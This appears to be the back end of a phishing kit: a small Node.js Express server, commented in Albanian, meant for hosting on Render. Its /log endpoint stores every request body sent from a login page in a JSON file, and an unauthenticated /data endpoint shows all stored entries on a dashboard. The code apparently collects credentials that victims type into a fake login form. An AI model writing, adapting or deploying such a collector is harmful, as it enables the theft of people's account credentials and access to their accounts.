const express = require("express");
const fs = require("fs");

const app = express();
app.use(express.json());

const DATA_FILE = "data.json";

// log nga login page
app.post("/log", (req, res) => {
  let data = [];

  if (fs.existsSync(DATA_FILE)) {
    data = JSON.parse(fs.readFileSync(DATA_FILE));
  }

  data.push(req.body);

  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));

  console.log("Saved:", req.body);

  res.json({ status: "ok" });
});

// për dashboard
app.get("/data", (req, res) => {
  if (!fs.existsSync(DATA_FILE)) return res.json([]);
  const data = JSON.parse(fs.readFileSync(DATA_FILE));
  res.json(data);
});

// 🔥 rëndësishme për Render:
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("✅ Server running on port " + PORT);
});